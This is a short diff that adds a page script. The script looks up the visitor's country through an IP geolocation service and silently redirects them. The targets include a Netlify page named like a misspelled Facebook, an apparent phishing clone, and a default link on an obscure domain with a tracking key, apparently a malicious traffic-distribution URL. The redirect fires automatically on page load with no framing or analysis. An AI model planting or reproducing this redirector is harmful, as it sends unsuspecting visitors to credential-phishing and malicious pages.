@@ -1,0 +1,46 @@
+<script>
+// Coutry Links
+var deFault = 'https://classwindscreensemi.com/aw9a1diu9i?key=1cda157be6fc8ced72f55289f9237865';
+var dO = 'https://www.google.com/';
+var cOL = 'https://fac3book-reetq-a5d5cb.netlify.app';
+var mX = '';
+var fR = '';
+var eS = '';
+var jP = '';
+var gB = '';
+var pR = '';
+var zA = '';
+var Ch = '';
+var sE = '';
+
+
+// Countries Redirect 
+$.get('https://ipapi.co/country/', (data)=>{
+switch (data) { 
+  case 'DO': window.location.href = dO;
+  break 	
+  case 'COL': window.location.href = cOL;
+  break 	
+  case 'MX': window.location.href = mX;
+  break 
+  case 'FR': window.location.href = fR;
+  break 	
+  case 'ES': window.location.href = eS;
+  break 
+  case 'JP': window.location.href = jP;
+  break 	
+  case 'GB': window.location.href = gB;
+  break 
+  case 'PR': window.location.href = pR;
+  break 	
+  case 'ZA': window.location.href = zA;
+  break 	
+  case 'CH': window.location.href = Ch;
+  break 	
+  case 'SE': window.location.href = sE;
+  break 	
+  default: window.location.href = deFault;
+  
+}
+});
+</script>
